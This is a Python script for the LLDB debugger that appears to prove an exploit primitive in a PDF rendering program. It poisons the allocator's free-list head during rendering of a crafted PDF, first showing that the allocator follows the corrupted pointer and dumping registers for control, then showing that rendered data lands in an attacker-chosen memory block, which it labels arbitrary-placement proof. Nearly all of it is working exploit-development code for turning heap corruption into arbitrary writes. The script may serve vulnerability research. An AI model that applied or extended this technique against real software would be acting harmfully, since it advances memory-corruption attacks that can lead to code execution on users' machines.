# RIP-20: poison-to-arbitrary-write mechanism proof.
# P1: recon x19 chain (head + first blocks). P2: overwrite free-list head with
# TARGET (guarded page) -> SIGSEGV on pop = allocator follows poison (regs dumped
# at strike for value-control recon). P3: poison again, UNGUARDED TARGET ->
# decode runs to exit -> dump what landed in the chosen block = data-in-block proof.
import os, sys, struct, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
TRACE = open(os.path.join(CWD, "rip20_trace.txt"), "a")
def T(s): print(s); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()

def qwords(p, addr, n):
    m = p.ReadMemory(addr, n*8, err)
    if not err.Success() or not m: return None
    return [struct.unpack('<Q', m[i*8:i*8+8])[0] for i in range(n)]

def wr(p, addr, data):
    p.WriteMemory(addr, data, err)
    return err.Success()

def stop5():
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.2)
    bpe = t.BreakpointCreateByName("aa_cache_render")
    p = t.LaunchSimple(["k2_d31472.pdf", "r.png"], None, CWD)
    if not p or not p.IsValid(): return None, None, None, None
    th = p.GetSelectedThread()
    pc = th.GetSelectedFrame().GetPCAddress().GetLoadAddress(t)
    bpw = t.BreakpointCreateByAddress(pc + 1804)
    x19 = x27 = 0
    for i in range(5):
        p.Continue()
        st = p.GetState()
        while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
        if st != lldb.eStateStopped: break
        fr = p.GetSelectedThread().GetSelectedFrame()
        x19 = fr.FindRegister("x19").GetValueAsUnsigned()
        x27 = fr.FindRegister("x27").GetValueAsUnsigned()
        if x19: break
    return p, x19, x27, (bpe, bpw)

def cleanup(bps):
    for b in bps:
        if b: t.BreakpointDelete(b.GetID())

# PHASE-1: recon
p, x19, x27, bps = stop5()
if not p:
    T("P1 launchfail"); TRACE.close(); sys.exit(0)
T("P1 x19=%x x27=%x" % (x19, x27))
head = qwords(p, x19, 8)
T("P1 x19[0..8]=%s" % [hex(q) for q in (head or [])])
if head and 0x100000000 <= head[0] < 0x800000000000:
    b1 = qwords(p, head[0], 8)
    T("P1 block1(head[0])=%s" % [hex(q) for q in (b1 or [])])
cleanup(bps); p.Kill()

# PHASE-2: guarded poison
p, x19, x27, bps = stop5()
if not p or not x19:
    T("P2 nox19"); cleanup(bps); TRACE.close(); sys.exit(0)
target = 0
for cand in (x27 + 0x20000, x27 + 0x30000, x27 + 0x40000, x27 - 0x30000):
    page = cand & ~0xFFF
    v = t.EvaluateExpression('(int)mprotect((void*)%d, 4096, 3)' % page)
    if v.GetValueAsSigned() == 0:
        target = page
        break
if not target:
    T("P2 no-target"); cleanup(bps); p.Kill(); TRACE.close(); sys.exit(0)
t.EvaluateExpression('(int)mprotect((void*)%d, 4096, 1)' % target)
T("P2 poison x19[0] -> %x (guarded)" % target)
wr(p, x19, struct.pack('<Q', target))
for b in bps:
    if b: t.BreakpointDelete(b.GetID())
p.Continue()
st = p.GetState()
while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
if st == lldb.eStateStopped:
    th2 = p.GetSelectedThread()
    fr2 = th2.GetSelectedFrame()
    off = -1
    if fr2.GetSymbol():
        off = fr2.GetPCAddress().GetLoadAddress(t) - fr2.GetSymbol().GetStartAddress().GetLoadAddress(t)
    desc = th2.GetStopDescription(300) or ""
    fa = 0
    if "address=" in desc:
        try: fa = int(desc.split("address=")[1].split(")")[0], 16)
        except Exception: pass
    T("P2 POP-PROOF: strike +%d fa=%x (target=%x %s)" % (off, fa, target, "ON-TARGET" if (fa >> 12) == (target >> 12) else "off"))
    regs = {}
    for r in ("x0","x1","x2","x3","x4","x5","x6","x7","x8","x9","x10","x11","x12","x13","x14","x15","x16","x17","x19","x20","x21","x22","x23","x24","x25","x26","x27","x28"):
        v = fr2.FindRegister(r).GetValueAsUnsigned()
        if v: regs[r] = v
    T("P2 regs: %s" % {k: hex(v) for k, v in regs.items()})
    p.Kill()
else:
    T("P2 no-pop rc=%s (poison not followed)" % p.GetExitStatus())

# PHASE-3: unguarded poison -> allocator pops chosen block -> glyph data lands
p, x19, x27, bps = stop5()
if not p or not x19:
    T("P3 nox19"); cleanup(bps); TRACE.close(); sys.exit(0)
blk = (x27 - 0x4000) + 0x100
wr(p, blk, bytes(0x400))  # zero the landing zone
wr(p, x19, struct.pack('<Q', blk))
T("P3 poison x19[0] -> %x (unguarded), zeroed 1KB" % blk)
# keep ONLY the walk bp; continue to next stop and read the block alive
for b in bps:
    if b and b.GetID() != bps[1].GetID(): t.BreakpointDelete(b.GetID())
bps[1].SetOneShot(False)
p.Continue()
st = p.GetState()
while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
if st == lldb.eStateStopped:
    data = p.ReadMemory(blk, 0x80, err)
    if err.Success() and data:
        nz = sum(1 for b in data if b)
        T("P3 BLOCK-CONTENT: nonzero=%d/128 first16=%s" % (nz, data[:16].hex()))
        if nz:
            T("P3 DATA-IN-CHOSEN-BLOCK = ARBITRARY-PLACEMENT PROOF")
    else:
        T("P3 read fail: %s" % err.GetCString())
    p.Kill()
else:
    T("P3 exited rc=%s before next stop" % p.GetExitStatus())
cleanup(bps)
T("RIP-20 DONE")
TRACE.close()
